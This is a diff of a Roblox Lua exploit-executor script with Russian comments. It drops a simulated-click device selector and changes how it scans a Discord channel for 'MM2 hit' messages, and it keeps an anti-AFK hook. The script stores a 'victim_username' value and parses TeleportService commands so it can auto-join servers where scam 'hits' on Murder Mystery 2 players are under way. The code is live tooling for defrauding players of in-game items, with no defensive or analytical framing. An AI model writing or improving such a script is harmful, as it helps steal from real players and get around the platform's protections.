@@ -17,19 +17,6 @@ game:GetService('Players').LocalPlayer.Idled:Connect(function()
     print("🔄 Anti-AFK активирован")
 end)
 
-local function selectDevice()
-    local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
-    if DeviceSelectGui then
-        local button = DeviceSelectGui.Container.Phone.Button
-        local centerX = button.AbsolutePosition.X + button.AbsoluteSize.X/2
-        local centerY = button.AbsolutePosition.Y + button.AbsoluteSize.Y/2
-        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
-        task.wait(0.1)
-        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
-        print("Выбрано устройство: Phone")
-    end
-end
-
 -- Настройки файлов
 local HttpService = game:GetService("HttpService")
 if not isfile("user.txt") then writefile("user.txt", "victim_username") end
@@ -72,7 +59,7 @@ local function checkDiscord()
 
     local messages = HttpService:JSONDecode(response.Body)
     for _, msg in ipairs(messages) do
-        if msg.embeds and msg.embeds[1] and msg.embeds[1].title:find("Join to get MM2 hit") then
+        if msg.content and msg.content:find("TeleportService") then
             print("🔍 Найдено сообщение с хитом!")
             
             local placeId, jobId = findTeleportCommand(msg.content)
